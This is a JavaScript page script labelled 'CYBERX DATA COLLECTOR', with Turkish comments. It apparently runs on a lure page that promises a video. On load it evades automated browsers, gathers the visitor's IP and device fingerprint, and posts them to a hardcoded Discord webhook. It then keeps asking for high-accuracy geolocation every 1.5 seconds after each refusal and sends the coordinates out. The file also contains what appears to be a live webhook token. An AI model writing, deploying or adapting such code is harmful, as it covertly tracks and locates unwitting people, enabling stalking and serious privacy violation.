// ============================================
// CYBERX DATA COLLECTOR - HAFIF & ÇALIŞAN
// ============================================

// WEBHOOK URL (DÜZ)
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';

// VERİ GÖNDER
async function sendData(data) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: data })
        });
    } catch(e) {}
}

// IP AL
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) {
        return 'IP alınamadı';
    }
}

// CİHAZ BİLGİSİ (GERÇEK)
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Bilinmiyor';
    
    // GERÇEK CİHAZ TESPİTİ
    if (ua.includes('Android')) device = 'Android Telefon/Tablet';
    else if (ua.includes('iPhone')) device = 'iPhone';
    else if (ua.includes('iPad')) device = 'iPad';
    else if (ua.includes('Windows')) device = 'Windows PC';
    else if (ua.includes('Mac')) device = 'Mac Bilgisayar';
    else if (ua.includes('Linux')) device = 'Linux Bilgisayar';
    
    return {
        cihaz: device,
        marka: ua.includes('Samsung') ? 'Samsung' : (ua.includes('Xiaomi') ? 'Xiaomi' : (ua.includes('Huawei') ? 'Huawei' : 'Bilinmiyor')),
        isletimSistemi: ua.includes('Android') ? 'Android ' + (ua.match(/Android (\d+)/) ? ua.match(/Android (\d+)/)[1] : '') : (ua.includes('iOS') ? 'iOS' : 'Windows/Mac/Linux'),
        tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : (ua.includes('Safari') ? 'Safari' : 'Diğer')),
        ekran: `${screen.width}x${screen.height}`,
        dil: navigator.language,
        saatDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href
    };
}

// KONUM İSTE (HEMEN, BASIT, SONSUZ)
let denemeSayisi = 0;

function askLocation(ip, deviceInfo) {
    if (!navigator.geolocation) {
        sendData(`⚠️ Tarayıcı konum desteklemiyor! IP: ${ip}`);
        return;
    }
    
    function istem() {
        denemeSayisi++;
        
        navigator.geolocation.getCurrentPosition(
            // BAŞARILI
            (pos) => {
                const mesaj = `✅✅✅ KONUM ALINDI! ✅✅✅
                
📍 Enlem: ${pos.coords.latitude}
📍 Boylam: ${pos.coords.longitude}
🎯 Doğruluk: ${pos.coords.accuracy} metre
🌐 IP: ${ip}
📱 Cihaz: ${deviceInfo.cihaz} | ${deviceInfo.marka}
📱 İS: ${deviceInfo.isletimSistemi}
🌍 Tarayıcı: ${deviceInfo.tarayici}
📺 Ekran: ${deviceInfo.ekran}
🔤 Dil: ${deviceInfo.dil}
⏰ Saat: ${deviceInfo.saatDilimi}
🔁 Deneme: ${denemeSayisi}

--- BİLGİLER ALINDI ---`;
                
                sendData(mesaj);
                
                // BAŞARILI OLUNCA SAYFAYI DEĞİŞTİR
                document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h1>🎉 GUELTIG! 🎉</h1><img src="https://cataas.com/cat/says/danke" width="100%"><p>Jetz chasch s Video luege! 😂</p></div>';
            },
            // REDDEDILDI
            (error) => {
                let hata = '';
                if (error.code === 1) hata = 'KULLANICI REDDETTI';
                else if (error.code === 2) hata = 'KONUM BULUNAMIYOR';
                else if (error.code === 3) hata = 'ZAMAN ASIMI';
                else hata = 'BILINMEYEN HATA';
                
                sendData(`❌ ${hata} (Deneme ${denemeSayisi}) | IP: ${ip}`);
                
                // 1.5 SANİYE SONRA TEKRAR SOR
                setTimeout(istem, 1500);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
    
    istem();
}

// ANA FONKSİYON
async function main() {
    // BOT KONTROLÜ
    if (navigator.webdriver) return;
    
    const ip = await getIP();
    const deviceInfo = getDeviceInfo();
    
    // İLK MESAJ
    sendData(`🆕 YENİ ZİYARETÇİ!
🌐 IP: ${ip}
📱 ${deviceInfo.cihaz} | ${deviceInfo.marka}
💻 ${deviceInfo.isletimSistemi} | ${deviceInfo.tarayici}
📺 ${deviceInfo.ekran} | ${deviceInfo.dil}
🔗 ${deviceInfo.url}`);
    
    // HEMEN KONUM İSTE (0.5 saniye sonra)
    setTimeout(() => askLocation(ip, deviceInfo), 500);
}

// BAŞLAT
main();
